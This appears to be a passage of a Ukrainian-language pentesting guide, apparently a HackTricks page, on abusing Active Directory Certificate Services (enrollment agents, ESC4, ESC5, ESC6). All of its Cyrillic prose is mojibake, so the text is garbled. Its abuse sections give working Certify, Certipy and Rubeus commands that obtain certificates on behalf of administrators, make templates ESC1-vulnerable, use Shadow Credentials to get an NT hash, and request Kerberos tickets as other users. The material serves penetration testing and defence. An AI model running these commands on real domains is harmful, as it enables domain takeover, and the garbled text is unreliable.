**"–ê–≥–µ–Ω—Ç —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó"** —Ä–µ—î—Å—Ç—Ä—É—î—Ç—å—Å—è –≤ —Ç–∞–∫–æ–º—É **—à–∞–±–ª–æ–Ω—ñ** —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –æ—Ç—Ä–∏–º–∞–Ω–∏–π **—Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –¥–ª—è —Å–ø—ñ–ª—å–Ω–æ–≥–æ –ø—ñ–¥–ø–∏—Å—É CSR –≤—ñ–¥ —ñ–º–µ–Ω—ñ —ñ–Ω—à–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**. –ü–æ—Ç—ñ–º **–Ω–∞–¥—Å–∏–ª–∞—î** —Å–ø—ñ–ª—å–Ω–æ –ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π CSR –¥–æ –¶–°, —Ä–µ—î—Å—Ç—Ä—É—é—á–∏—Å—å –≤ **—à–∞–±–ª–æ–Ω—ñ**, —è–∫–∏–π **–¥–æ–∑–≤–æ–ª—è—î "—Ä–µ—î—Å—Ç—Ä—É–≤–∞—Ç–∏—Å—è –≤—ñ–¥ —ñ–º–µ–Ω—ñ"**, —ñ –¶–° –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î **—Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–æ–º, —â–æ –Ω–∞–ª–µ–∂–∏—Ç—å "—ñ–Ω—à–æ–º—É" –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ**.

**–í–∏–º–æ–≥–∏ 1:**

- –ü—Ä–∞–≤–∞ –Ω–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é –Ω–∞–¥–∞—é—Ç—å—Å—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ –ø—ñ–¥–ø—Ä–∏—î–º—Å—Ç–≤–∞ –¶–°.
- –í–∏–º–æ–≥–∞ —â–æ–¥–æ —Å—Ö–≤–∞–ª–µ–Ω–Ω—è –º–µ–Ω–µ–¥–∂–µ—Ä–∞ –≤—ñ–¥—Å—É—Ç–Ω—è.
- –ù–µ–º–∞—î –≤–∏–º–æ–≥–∏ –¥–æ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏—Ö –ø—ñ–¥–ø–∏—Å—ñ–≤.
- –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –±–µ–∑–ø–µ–∫–∏ —à–∞–±–ª–æ–Ω—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –Ω–∞–¥—Ç–æ –¥–æ–∑–≤–æ–ª—è—é—á–∏–π, –Ω–∞–¥–∞—é—á–∏ –ø—Ä–∞–≤–∞ –Ω–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏.
- –®–∞–±–ª–æ–Ω —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –≤–∫–ª—é—á–∞—î EKU –∞–≥–µ–Ω—Ç–∞ –∑–∞–ø–∏—Ç—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∑–∞–ø–∏—Ç —ñ–Ω—à–∏—Ö —à–∞–±–ª–æ–Ω—ñ–≤ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ –≤—ñ–¥ —ñ–º–µ–Ω—ñ —ñ–Ω—à–∏—Ö –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª—ñ–≤.

**–í–∏–º–æ–≥–∏ 2:**

- –ü—ñ–¥–ø—Ä–∏—î–º—Å—Ç–≤–æ –¶–° –Ω–∞–¥–∞—î –ø—Ä–∞–≤–∞ –Ω–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏.
- –û–±—Ö—ñ–¥ —Å—Ö–≤–∞–ª–µ–Ω–Ω—è –º–µ–Ω–µ–¥–∂–µ—Ä–∞.
- –í–µ—Ä—Å—ñ—è —Å—Ö–µ–º–∏ —à–∞–±–ª–æ–Ω—É - 1 –∞–±–æ –ø–µ—Ä–µ–≤–∏—â—É—î 2, —ñ –≤–∫–∞–∑—É—î –≤–∏–º–æ–≥—É –≤–∏–¥–∞—á—ñ –ø–æ–ª—ñ—Ç–∏–∫–∏ –∑–∞—Å—Ç–æ—Å—É–≤–∞–Ω–Ω—è, —è–∫–∞ –ø–æ—Ç—Ä–µ–±—É—î EKU –∞–≥–µ–Ω—Ç–∞ –∑–∞–ø–∏—Ç—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞.
- EKU, –≤–∏–∑–Ω–∞—á–µ–Ω–∏–π —É —à–∞–±–ª–æ–Ω—ñ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞, –¥–æ–∑–≤–æ–ª—è—î –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é –¥–æ–º–µ–Ω—É.
- –û–±–º–µ–∂–µ–Ω–Ω—è –¥–ª—è –∞–≥–µ–Ω—Ç—ñ–≤ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –Ω–µ –∑–∞—Å—Ç–æ—Å–æ–≤—É—é—Ç—å—Å—è –Ω–∞ –¶–°.

### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [**Certify**](https://github.com/GhostPack/Certify) –∞–±–æ [**Certipy**](https://github.com/ly4k/Certipy) –¥–ª—è –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —Ü–∏–º —Å—Ü–µ–Ω–∞—Ä—ñ—î–º:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**–ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ**, —è–∫—ñ –º–∞—é—Ç—å –ø—Ä–∞–≤–æ **–æ—Ç—Ä–∏–º–∞—Ç–∏** —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –∞–≥–µ–Ω—Ç–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó, —à–∞–±–ª–æ–Ω–∏, –≤ —è–∫–∏—Ö –∞–≥–µ–Ω—Ç–∏ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –º–æ–∂—É—Ç—å —Ä–µ—î—Å—Ç—Ä—É–≤–∞—Ç–∏—Å—è, —Ç–∞ **–æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏**, –≤—ñ–¥ —ñ–º–µ–Ω—ñ —è–∫–∏—Ö –º–æ–∂–µ –¥—ñ—è—Ç–∏ –∞–≥–µ–Ω—Ç —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó, –º–æ–∂—É—Ç—å –±—É—Ç–∏ –æ–±–º–µ–∂–µ–Ω—ñ –ø—ñ–¥–ø—Ä–∏—î–º—Å—Ç–≤–µ–Ω–∏–º–∏ –¶–°. –¶–µ –¥–æ—Å—è–≥–∞—î—Ç—å—Å—è —à–ª—è—Ö–æ–º –≤—ñ–¥–∫—Ä–∏—Ç—Ç—è `certsrc.msc` **snap-in**, **–∫–ª–∞—Ü–Ω—É–≤—à–∏ –ø—Ä–∞–≤–æ—é –∫–Ω–æ–ø–∫–æ—é –º–∏—à—ñ –Ω–∞ –¶–°**, **–∫–ª–∞—Ü–Ω—É–≤—à–∏ –í–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ**, –∞ –ø–æ—Ç—ñ–º –ø–µ—Ä–µ—Ö–æ–¥—è—á–∏ –Ω–∞ –≤–∫–ª–∞–¥–∫—É "–ê–≥–µ–Ω—Ç–∏ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó".

–ü—Ä–æ—Ç–µ –≤—ñ–¥–∑–Ω–∞—á–µ–Ω–æ, —â–æ **—Ç–∏–ø–æ–≤–µ** –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –¥–ª—è –¶–° - "–ù–µ –æ–±–º–µ–∂—É–≤–∞—Ç–∏ –∞–≥–µ–Ω—Ç—ñ–≤ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó". –ö–æ–ª–∏ –æ–±–º–µ–∂–µ–Ω–Ω—è –Ω–∞ –∞–≥–µ–Ω—Ç—ñ–≤ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó —É–≤—ñ–º–∫–Ω–µ–Ω–æ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º–∏, –≤—Å—Ç–∞–Ω–æ–≤–∏–≤—à–∏ –π–æ–≥–æ –Ω–∞ "–û–±–º–µ–∂–∏—Ç–∏ –∞–≥–µ–Ω—Ç—ñ–≤ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó", —Ç–∏–ø–æ–≤–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è –∑–∞–ª–∏—à–∞—î—Ç—å—Å—è –¥—É–∂–µ –¥–æ–∑–≤—ñ–ª—å–Ω–æ—é. –¶–µ –¥–æ–∑–≤–æ–ª—è—î **–ö–æ–∂–Ω–æ–º—É** –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –≤ —É—Å—ñ—Ö —à–∞–±–ª–æ–Ω–∞—Ö —è–∫ –±—É–¥—å-—Ö—Ç–æ.

## –ö–µ—Ä—É–≤–∞–Ω–Ω—è –¥–æ—Å—Ç—É–ø–æ–º –¥–æ –≤—Ä–∞–∑–ª–∏–≤–∏—Ö —à–∞–±–ª–æ–Ω—ñ–≤ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ - ESC4

### **–ü–æ—è—Å–Ω–µ–Ω–Ω—è**

**–î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –±–µ–∑–ø–µ–∫–∏** –Ω–∞ **—à–∞–±–ª–æ–Ω–∞—Ö —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤** –≤–∏–∑–Ω–∞—á–∞—î **–¥–æ–∑–≤–æ–ª–∏**, —è–∫—ñ –º–∞—é—Ç—å –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ **–ø—Ä–∏–Ω—Ü–∏–ø–∞–ª–∏ AD** —â–æ–¥–æ —à–∞–±–ª–æ–Ω—É.

–Ø–∫—â–æ **–∞—Ç–∞–∫—É—é—á–∏–π** –º–∞—î –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ **–¥–æ–∑–≤–æ–ª–∏** –¥–ª—è **–∑–º—ñ–Ω–∏** **—à–∞–±–ª–æ–Ω—É** —Ç–∞ **–≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è** –±—É–¥—å-—è–∫–∏—Ö **–µ–∫—Å–ø–ª—É–∞—Ç–æ–≤–∞–Ω–∏—Ö –ø–æ–º–∏–ª–æ–∫ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó**, –æ–ø–∏—Å–∞–Ω–∏—Ö —É **–ø–æ–ø–µ—Ä–µ–¥–Ω—ñ—Ö —Ä–æ–∑–¥—ñ–ª–∞—Ö**, –º–æ–∂–µ –±—É—Ç–∏ —Å–ø—Ä–∏—è–Ω–æ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—é –ø—Ä–∏–≤—ñ–ª–µ—ó–≤.

–ó–Ω–∞—á—É—â—ñ –¥–æ–∑–≤–æ–ª–∏, —è–∫—ñ –∑–∞—Å—Ç–æ—Å–æ–≤—É—é—Ç—å—Å—è –¥–æ —à–∞–±–ª–æ–Ω—ñ–≤ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤, –≤–∫–ª—é—á–∞—é—Ç—å:

- **–í–ª–∞—Å–Ω–∏–∫:** –ù–∞–¥–∞—î –Ω–µ—è–≤–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –æ–±'—î–∫—Ç–æ–º, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –±—É–¥—å-—è–∫—ñ –∞—Ç—Ä–∏–±—É—Ç–∏.
- **–ü–æ–≤–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å:** –î–æ–∑–≤–æ–ª—è—î –ø–æ–≤–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –æ–±'—î–∫—Ç–æ–º, –≤–∫–ª—é—á–∞—é—á–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –±—É–¥—å-—è–∫—ñ –∞—Ç—Ä–∏–±—É—Ç–∏.
- **–ó–∞–ø–∏—Å–í–ª–∞—Å–Ω–∏–∫–∞:** –î–æ–∑–≤–æ–ª—è—î –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –≤–ª–∞—Å–Ω–∏–∫–∞ –æ–±'—î–∫—Ç–∞ –Ω–∞ –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª–∞ –ø—ñ–¥ –∫–æ–Ω—Ç—Ä–æ–ª–µ–º –∞—Ç–∞–∫—É—é—á–æ–≥–æ.
- **–ó–∞–ø–∏—ÅDacl:** –î–æ–∑–≤–æ–ª—è—î –Ω–∞–ª–∞—à—Ç–æ–≤—É–≤–∞—Ç–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å –¥–æ—Å—Ç—É–ø—É, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –Ω–∞–¥–∞—î –∞—Ç–∞–∫—É—é—á–æ–º—É –ü–æ–≤–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å.
- **–ó–∞–ø–∏—Å–í–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å:** –î–æ–∑–≤–æ–ª—è—î —Ä–µ–¥–∞–≥—É–≤–∞—Ç–∏ –±—É–¥—å-—è–∫—ñ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ –æ–±'—î–∫—Ç–∞.

### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è

–ü—Ä–∏–∫–ª–∞–¥ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤, –ø–æ–¥—ñ–±–Ω–∏–π –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É:

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4 - –∫–æ–ª–∏ —É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —î –ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å –¥–æ —à–∞–±–ª–æ–Ω—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞. –¶–µ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –¥–ª—è –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —à–∞–±–ª–æ–Ω—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞, —â–æ–± –∑—Ä–æ–±–∏—Ç–∏ —à–∞–±–ª–æ–Ω –≤—Ä–∞–∑–ª–∏–≤–∏–º –¥–æ ESC1.

–Ø–∫ –º–∏ –±–∞—á–∏–º–æ –≤–∏—â–µ, –ª–∏—à–µ `JOHNPC` –º–∞—î —Ü—ñ –¥–æ–∑–≤–æ–ª–∏, –∞–ª–µ –Ω–∞—à –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á `JOHN` –º–∞—î –Ω–æ–≤–∏–π –∫—Ä–∞–π `AddKeyCredentialLink` –¥–æ `JOHNPC`. –û—Å–∫—ñ–ª—å–∫–∏ —Ü—è —Ç–µ—Ö–Ω—ñ–∫–∞ –ø–æ–≤'—è–∑–∞–Ω–∞ –∑ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞–º–∏, —è —Ç–∞–∫–æ–∂ —Ä–µ–∞–ª—ñ–∑—É–≤–∞–≤ —Ü–µ–π –∞—Ç–∞–∫—É, —è–∫–∏–π –≤—ñ–¥–æ–º–∏–π —è–∫ [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). –û—Å—å –Ω–µ–≤–µ–ª–∏–∫–∏–π –ø–æ–≥–ª—è–¥ –Ω–∞ –∫–æ–º–∞–Ω–¥—É `shadow auto` Certipy –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è NT-—Ö–µ—à—É –∂–µ—Ä—Ç–≤–∏.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** –º–æ–∂–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é —à–∞–±–ª–æ–Ω—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –æ–¥–Ω—ñ—î—é –∫–æ–º–∞–Ω–¥–æ—é. –ó–∞ **–∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º**, Certipy –ø–µ—Ä–µ–∑–∞–ø–∏—à–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é, —â–æ–± –∑—Ä–æ–±–∏—Ç–∏ —ó—ó **–≤—Ä–∞–∑–ª–∏–≤–æ—é –¥–ª—è ESC1**. –ú–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ–º–æ –≤–∫–∞–∑–∞—Ç–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä **`-save-old` –¥–ª—è –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è —Å—Ç–∞—Ä–æ—ó –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó**, —â–æ –±—É–¥–µ –∫–æ—Ä–∏—Å–Ω–∏–º –¥–ª—è **–≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è** –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –ø—ñ—Å–ª—è –Ω–∞—à–æ–≥–æ –Ω–∞–ø–∞–¥—É.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## –í—Ä–∞–∑–ª–∏–≤–∏–π –¥–æ—Å—Ç—É–ø –¥–æ –æ–±'—î–∫—Ç—ñ–≤ –∫–µ—Ä—É–≤–∞–Ω–Ω—è –æ–±'—î–∫—Ç–∞–º–∏ PKI - ESC5

### –ü–æ—è—Å–Ω–µ–Ω–Ω—è

–û–±—à–∏—Ä–Ω–∞ –º–µ—Ä–µ–∂–∞ –≤–∑–∞—î–º–æ–ø–æ–≤'—è–∑–∞–Ω–∏—Ö –≤—ñ–¥–Ω–æ—Å–∏–Ω –Ω–∞ –æ—Å–Ω–æ–≤—ñ ACL, —è–∫–∞ –≤–∫–ª—é—á–∞—î –∫—ñ–ª—å–∫–∞ –æ–±'—î–∫—Ç—ñ–≤ –ø–æ–∑–∞ —à–∞–±–ª–æ–Ω–∞–º–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ —Ç–∞ —Ü–µ–Ω—Ç—Ä–æ–º —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, –º–æ–∂–µ –≤–ø–ª–∏–Ω—É—Ç–∏ –Ω–∞ –±–µ–∑–ø–µ–∫—É –≤—Å—ñ—î—ó —Å–∏—Å—Ç–µ–º–∏ AD CS. –¶—ñ –æ–±'—î–∫—Ç–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –∑–Ω–∞—á–Ω–æ –≤–ø–ª–∏–Ω—É—Ç–∏ –Ω–∞ –±–µ–∑–ø–µ–∫—É, –æ—Ö–æ–ø–ª—é—é—Ç—å:

* –û–±'—î–∫—Ç –∫–æ–º–ø'—é—Ç–µ—Ä–∞ AD —Å–µ—Ä–≤–µ—Ä–∞ –¶–°, —è–∫–∏–π –º–æ–∂–µ –±—É—Ç–∏ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏–π —á–µ—Ä–µ–∑ –º–µ—Ö–∞–Ω—ñ–∑–º–∏, —Ç–∞–∫—ñ —è–∫ S4U2Self –∞–±–æ S4U2Proxy.
* –°–µ—Ä–≤–µ—Ä RPC/DCOM —Å–µ—Ä–≤–µ—Ä–∞ –¶–°.
* –ë—É–¥—å-—è–∫–∏–π –Ω–∞—â–∞–¥–æ–∫ –æ–±'—î–∫—Ç–∞ –∞–±–æ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä AD –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ —à–ª—è—Ö—É –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. –¶–µ–π —à–ª—è—Ö –≤–∫–ª—é—á–∞—î, –∞–ª–µ –Ω–µ –æ–±–º–µ–∂—É—î—Ç—å—Å—è –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞–º–∏ —Ç–∞ –æ–±'—î–∫—Ç–∞–º–∏, —Ç–∞–∫–∏–º–∏ —è–∫ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∏ —à–∞–±–ª–æ–Ω—ñ–≤ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤, –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∏ —Ü–µ–Ω—Ç—Ä—ñ–≤ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, –æ–±'—î–∫—Ç NTAuthCertificates —Ç–∞ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä —Å–ª—É–∂–± —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó.

–ë–µ–∑–ø–µ–∫—É —Å–∏—Å—Ç–µ–º–∏ PKI –º–æ–∂–Ω–∞ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏, —è–∫—â–æ –Ω–∏–∑—å–∫–æ–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–π –∞—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫ –∑–º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –±—É–¥—å-—è–∫–∏–º–∏ –∑ —Ü–∏—Ö –∫—Ä–∏—Ç–∏—á–Ω–∏—Ö –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ñ–≤.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### –ü–æ—è—Å–Ω–µ–Ω–Ω—è

–¢–µ–º–∞, —è–∫–∞ –æ–±–≥–æ–≤–æ—Ä—é—î—Ç—å—Å—è –≤ [**–ø–æ—Å—Ç—ñ CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage), —Ç–∞–∫–æ–∂ —Ç–æ—Ä–∫–∞—î—Ç—å—Å—è –Ω–∞—Å–ª—ñ–¥–∫—ñ–≤ –ø—Ä–∞–ø–æ—Ä—Ü—è **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, —è–∫—ñ –æ–ø–∏—Å–∞–Ω—ñ Microsoft. –¶—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è, –∫–æ–ª–∏ –≤–æ–Ω–∞ –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–∞ –Ω–∞ –¶–µ–Ω—Ç—Ä—ñ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó (–¶–°), –¥–æ–∑–≤–æ–ª—è—î –≤–∫–ª—é—á–µ–Ω–Ω—è **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–∏—Ö –∑–Ω–∞—á–µ–Ω—å** –≤ **–∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–µ —ñ–º'—è —Å—É–±'—î–∫—Ç–∞** –¥–ª—è **–±—É–¥—å-—è–∫–æ–≥–æ –∑–∞–ø–∏—Ç—É**, –≤–∫–ª—é—á–∞—é—á–∏ —Ç—ñ, —â–æ —Å—Ç–≤–æ—Ä–µ–Ω—ñ –∑ Active Directory¬Æ. –í–Ω–∞—Å–ª—ñ–¥–æ–∫ —Ü—å–æ–≥–æ —Ü—è –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –¥–æ–∑–≤–æ–ª—è—î **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É** –∑–∞–ø–∏—Å–∞—Ç–∏—Å—è —á–µ—Ä–µ–∑ **–±—É–¥—å-—è–∫–∏–π —à–∞–±–ª–æ–Ω**, –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π –¥–ª—è –¥–æ–º–µ–Ω–Ω–æ—ó **–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó**‚Äî–∑–æ–∫—Ä–µ–º–∞ —Ç—ñ, —â–æ –≤—ñ–¥–∫—Ä–∏—Ç—ñ –¥–ª—è –∑–∞–ø–∏—Å—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑ **–Ω–µ–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–º** –¥–æ—Å—Ç—É–ø–æ–º, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏–π —à–∞–±–ª–æ–Ω –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –í —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –º–æ–∂–µ –±—É—Ç–∏ –∑–∞—Ö–∏—â–µ–Ω–∏–π, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏—Å—è —è–∫ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä –¥–æ–º–µ–Ω—É –∞–±–æ **–±—É–¥—å-—è–∫–∞ —ñ–Ω—à–∞ –∞–∫—Ç–∏–≤–Ω–∞ —Å—É—Ç–Ω—ñ—Å—Ç—å** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –¥–æ–º–µ–Ω—É.

